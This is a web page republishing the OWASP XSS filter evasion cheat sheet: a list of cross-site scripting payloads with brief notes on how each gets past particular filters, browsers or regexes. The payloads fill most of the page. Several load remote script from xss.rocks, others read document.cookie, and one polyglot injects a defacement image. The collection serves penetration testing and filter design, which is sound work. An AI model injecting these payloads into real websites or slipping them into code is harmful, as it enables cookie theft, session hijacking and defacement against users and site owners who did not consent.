---
ID: 37
post_title: XSS Payloads Cheat Sheet
post_name: sample-page
author: Robbie
post_date: 2017-02-07 14:40:47
layout: page
link: https://xsses.rocks/sample-page/
published: true
tags: [ ]
categories: [ ]
---
<h2><span id="XSS_Locator_.28short.29" class="mw-headline">XSS Locator (short)</span></h2>
If you don't have much space and know there is no vulnerable JavaScript on the page, this string is a nice compact XSS injection check. View source after injecting it and look for &lt;XSS verses &amp;lt;XSS to see if it is vulnerable:
<pre>'';!--"&lt;XSS&gt;=&amp;{()}
</pre>
<h2><span id="No_Filter_Evasion" class="mw-headline">No Filter Evasion</span></h2>
This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here):
<pre>&lt;SCRIPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;
</pre>
<h2><span id="Filter_bypass_based_polyglot" class="mw-headline">Filter bypass based polyglot</span></h2>
<pre>'"&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;"&gt;&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1)&gt;
&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;'--&gt;"&gt;&lt;/script&gt;
&lt;script&gt;alert(document.cookie)&lt;/script&gt;"&gt;
&lt;img/id="confirm&amp;lpar;1)"/alt="/"src="/"onerror=eval(id)&gt;'"&gt;
&lt;img src="http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg"&gt;</pre>
<h2><span id="Image_XSS_using_the_JavaScript_directive" class="mw-headline">Image XSS using the JavaScript directive</span></h2>
Image XSS using the JavaScript directive (IE7.0 doesn't support the JavaScript directive in context of an image, but it does in other contexts, but the following show the principles that would work in other tags as well:
<pre>&lt;IMG SRC="javascript:alert('XSS');"&gt;
</pre>
<h2><span id="No_quotes_and_no_semicolon" class="mw-headline">No quotes and no semicolon</span></h2>
<pre>&lt;IMG SRC=javascript:alert('XSS')&gt;
</pre>
<h2><span id="Case_insensitive_XSS_attack_vector" class="mw-headline">Case insensitive XSS attack vector</span></h2>
<pre>&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;
</pre>
<h2><span id="HTML_entities" class="mw-headline">HTML entities</span></h2>
The semicolons are required for this to work:
<pre>&lt;IMG SRC=javascript:alert("XSS")&gt;
</pre>
<h2><span id="Grave_accent_obfuscation" class="mw-headline">Grave accent obfuscation</span></h2>
If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don't know about grave accents:
<pre>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`&gt;
</pre>
<h2><span id="Malformed_A_tags" class="mw-headline">Malformed A tags</span></h2>
Skip the HREF attribute and get to the meat of the XXS... Submitted by David Cross ~ Verified on Chrome

&lt;a onmouseover="alert(document.cookie)"&gt;xxs link&lt;/a&gt;

or Chrome loves to replace missing quotes for you... if you ever get stuck just leave them off and Chrome will put them in the right place and fix your missing quotes on a URL or script.

&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;
<h2><span id="Malformed_IMG_tags" class="mw-headline">Malformed IMG tags</span></h2>
Originally found by Begeek (but cleaned up and shortened to work in all browsers), this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes. I assume this was originally meant to correct sloppy coding. This would make it significantly more difficult to correctly parse apart an HTML tag:
<pre>&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;
</pre>
<h2><span id="fromCharCode" class="mw-headline">fromCharCode</span></h2>
If no quotes of any kind are allowed you can eval() a fromCharCode in JavaScript to create any XSS vector you need:
<pre>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
</pre>
<h2><span id="Default_SRC_tag_to_get_past_filters_that_check_SRC_domain" class="mw-headline">Default SRC tag to get past filters that check SRC domain</span></h2>
This will bypass most SRC domain filters. Inserting javascript in an event method will also apply to any HTML tag type injection that uses elements like Form, Iframe, Input, Embed etc. It will also allow any relevant event for the tag type to be substituted like onblur, onclick giving you an extensive amount of variations for many injections listed here. Submitted by David Cross .

Edited by Abdullah Hussam(@Abdulahhusam).
<pre>&lt;IMG SRC=# onmouseover="alert('xxs')"&gt;
</pre>
<h2><span id="Default_SRC_tag_by_leaving_it_empty" class="mw-headline">Default SRC tag by leaving it empty</span></h2>
<pre>&lt;IMG SRC= onmouseover="alert('xxs')"&gt;
</pre>
<h2><span id="Default_SRC_tag_by_leaving_it_out_entirely" class="mw-headline">Default SRC tag by leaving it out entirely</span></h2>
<pre>&lt;IMG onmouseover="alert('xxs')"&gt;
</pre>
<h2><span id="On_error_alert" class="mw-headline">On error alert</span></h2>
<pre>&lt;IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"&gt;&lt;/img&gt;
</pre>
<h2><span id="IMG_onerror_and_javascript_alert_encode" class="mw-headline">IMG onerror and javascript alert encode</span></h2>
<pre>&lt;img src=x onerror="&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041"&gt;
</pre>
<h2><span id="Decimal_HTML_character_references" class="mw-headline">Decimal HTML character references</span></h2>
all of the XSS examples that use a javascript: directive inside of an &lt;IMG tag will not work in Firefox or Netscape 8.1+ in the Gecko rendering engine mode).
<pre>&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;
&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
</pre>
<h2><span id="Decimal_HTML_character_references_without_trailing_semicolons" class="mw-headline">Decimal HTML character references without trailing semicolons</span></h2>
This is often effective in XSS that attempts to look for "&amp;#XX;", since most people don't know about padding - up to 7 numeric characters total. This is also useful against people who decode against strings like $tmp_string =~ s/.*\&amp;#(\d+);.*/$1/; which incorrectly assumes a semicolon is required to terminate a html encoded string (I've seen this in the wild):
<pre>&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;
#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
</pre>
<h2><span id="Hexadecimal_HTML_character_references_without_trailing_semicolons" class="mw-headline">Hexadecimal HTML character references without trailing semicolons</span></h2>
This is also a viable XSS attack against the above string $tmp_string =~ s/.*\&amp;#(\d+);.*/$1/; which assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters).
<pre>&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
</pre>
<h2><span id="Embedded_tab" class="mw-headline">Embedded tab</span></h2>
Used to break up the cross site scripting attack:
<pre>&lt;IMG SRC="jav	ascript:alert('XSS');"&gt;
</pre>
<h2><span id="Embedded_Encoded_tab" class="mw-headline">Embedded Encoded tab</span></h2>
Use this one to break up XSS :
<pre>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"&gt;
</pre>
<h2><span id="Embedded_newline_to_break_up_XSS" class="mw-headline">Embedded newline to break up XSS</span></h2>
Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. See the ascii chart for more details. The following four XSS examples illustrate this vector:
<pre>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"&gt;
</pre>
<h2><span id="Embedded_carriage_return_to_break_up_XSS" class="mw-headline">Embedded carriage return to break up XSS</span></h2>
(Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.):
<pre>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"&gt;
</pre>
<h2><span id="Null_breaks_up_JavaScript_directive" class="mw-headline">Null breaks up JavaScript directive</span></h2>
Null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy or use %00 in the URL string or if you want to write your own injection tool you can either use vim (^V^@ will produce a null) or the following program to generate it into a text file. Okay, I lied again, older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hypen control char). But the null char %00is much more useful and helped me bypass certain real world filters with a variation on this example:
<pre>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")&gt;";' &gt; out
</pre>
<h2><span id="Spaces_and_meta_chars_before_the_JavaScript_in_images_for_XSS" class="mw-headline">Spaces and meta chars before the JavaScript in images for XSS</span></h2>
This is useful if the pattern match doesn't take into account spaces in the word "javascript:" -which is correct since that won't render- and makes the false assumption that you can't have a space between the quote and the "javascript:" keyword. The actual reality is you can have any char from 1-32 in decimal:
<pre>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"&gt;
</pre>
<h2><span id="Non-alpha-non-digit_XSS" class="mw-headline">Non-alpha-non-digit XSS</span></h2>
The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefor considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example "&lt;SCRIPT\s" != "&lt;SCRIPT/XSS\s":
<pre>&lt;SCRIPT/XSS SRC="http://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
</pre>
Based on the same idea as above, however,expanded on it, using Rnake fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc...) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this also applies to the grave accent char as seen here:
<pre>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")&gt;
</pre>
Yair Amit brought this to my attention that there is slightly different behavior between the IE and Gecko rendering engines that allows just a slash between the tag and the parameter with no spaces. This could be useful if the system does not allow spaces.
<pre>&lt;SCRIPT/SRC="http://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
</pre>
<h2><span id="Extraneous_open_brackets" class="mw-headline">Extraneous open brackets</span></h2>
Submitted by Franz Sedlmaier, this XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like Boyer-Moore that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course). The double slash comments out the ending extraneous bracket to supress a JavaScript error:
<pre>&lt;&lt;SCRIPT&gt;alert("XSS");//&lt;&lt;/SCRIPT&gt;
</pre>
<h2><span id="No_closing_script_tags" class="mw-headline">No closing script tags</span></h2>
In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don't actually need the "&gt;&lt;/SCRIPT&gt;" portion of this Cross Site Scripting vector. Firefox assumes it's safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn't effect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they're not needed generally, although beware, I have no idea what the HTML will end up looking like once this is injected:
<pre>&lt;SCRIPT SRC=http://xss.rocks/xss.js?&lt; B &gt;
</pre>
<h2><span id="Protocol_resolution_in_script_tags" class="mw-headline">Protocol resolution in script tags</span></h2>
This particular variant was submitted by Łukasz Pilorz and was based partially off of Ozh's protocol resolution bypass below. This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a &lt;/SCRIPT&gt; tag at the end. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The ".j" is valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag.
<pre>&lt;SCRIPT SRC=//xss.rocks/.j&gt;
</pre>
<h2><span id="Half_open_HTML.2FJavaScript_XSS_vector" class="mw-headline">Half open HTML/JavaScript XSS vector</span></h2>
Unlike Firefox the IE rendering engine doesn't add extra data to your page, but it does allow the javascript: directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes there is any HTML tag below where you are injecting this cross site scripting vector. Even though there is no close "&gt;" tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex: /((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/ because it doesn't require the end "&gt;". As a side note, this was also affective against a real world XSS filter I came across using an open ended &lt;IFRAME tag instead of an &lt;IMG tag:
<pre>&lt;IMG SRC="javascript:alert('XSS')"
</pre>
<h2><span id="Double_open_angle_brackets" class="mw-headline">Double open angle brackets</span></h2>
Using an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering. Without it, Firefox will work but Netscape won't:
<pre>&lt;iframe src=http://xss.rocks/scriptlet.html &lt;
</pre>
<h2><span id="Escaping_JavaScript_escapes" class="mw-headline">Escaping JavaScript escapes</span></h2>
When the application is written to output some user information inside of a JavaScript like the following: &lt;SCRIPT&gt;var a="$ENV{QUERY_STRING}";&lt;/SCRIPT&gt; and you want to inject your own JavaScript into it but the server side application escapes certain quotes you can circumvent that by escaping their escape character. When this gets injected it will read &lt;SCRIPT&gt;var a="\\";alert('XSS');//";&lt;/SCRIPT&gt; which ends up un-escaping the double quote and causing the Cross Site Scripting vector to fire. The XSS locator uses this method.:
<pre>\";alert('XSS');//
</pre>
An alternative, if correct JSON or Javascript escaping has been applied to the embedded data but not HTML encoding, is to finish the script block and start your own:
<pre>&lt;/script&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;
</pre>
<h2><span id="End_title_tag" class="mw-headline">End title tag</span></h2>
This is a simple XSS vector that closes &lt;TITLE&gt; tags, which can encapsulate the malicious cross site scripting attack:
<pre>&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;
</pre>
<h2><span id="INPUT_image" class="mw-headline">INPUT image</span></h2>
<pre>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"&gt;
</pre>
<h2><span id="BODY_image" class="mw-headline">BODY image</span></h2>
<pre>&lt;BODY BACKGROUND="javascript:alert('XSS')"&gt;
</pre>
<h2><span id="IMG_Dynsrc" class="mw-headline">IMG Dynsrc</span></h2>
<pre>&lt;IMG DYNSRC="javascript:alert('XSS')"&gt;
</pre>
<h2><span id="IMG_lowsrc" class="mw-headline">IMG lowsrc</span></h2>
<pre>&lt;IMG LOWSRC="javascript:alert('XSS')"&gt;
</pre>
<h2><span id="List-style-image" class="mw-headline">List-style-image</span></h2>
Fairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting vector:
<pre>&lt;STYLE&gt;li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;
</pre>
<h2><span id="VBscript_in_an_image" class="mw-headline">VBscript in an image</span></h2>
<pre>&lt;IMG SRC='vbscript:msgbox("XSS")'&gt;
</pre>
<h2><span id="Livescript_.28older_versions_of_Netscape_only.29" class="mw-headline">Livescript (older versions of Netscape only)</span></h2>
<pre>&lt;IMG SRC="livescript:[code]"&gt;
</pre>
<h2><span id="SVG_object_tag" class="mw-headline">SVG object tag</span></h2>
<pre>&lt;svg/onload=alert('XSS')&gt;
</pre>
<h2><span id="ECMAScript_6" class="mw-headline">ECMAScript 6</span></h2>
<pre>Set.constructor`alert\x28document.domain\x29```
</pre>
<h2><span id="BODY_tag" class="mw-headline">BODY tag</span></h2>
Method doesn't require using any variants of "javascript:" or "&lt;SCRIPT..." to accomplish the XSS attack). Dan Crowley additionally noted that you can put a space before the equals sign ("onload=" != "onload ="):
<pre>&lt;BODY ONLOAD=alert('XSS')&gt;

take from</pre>
<a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a>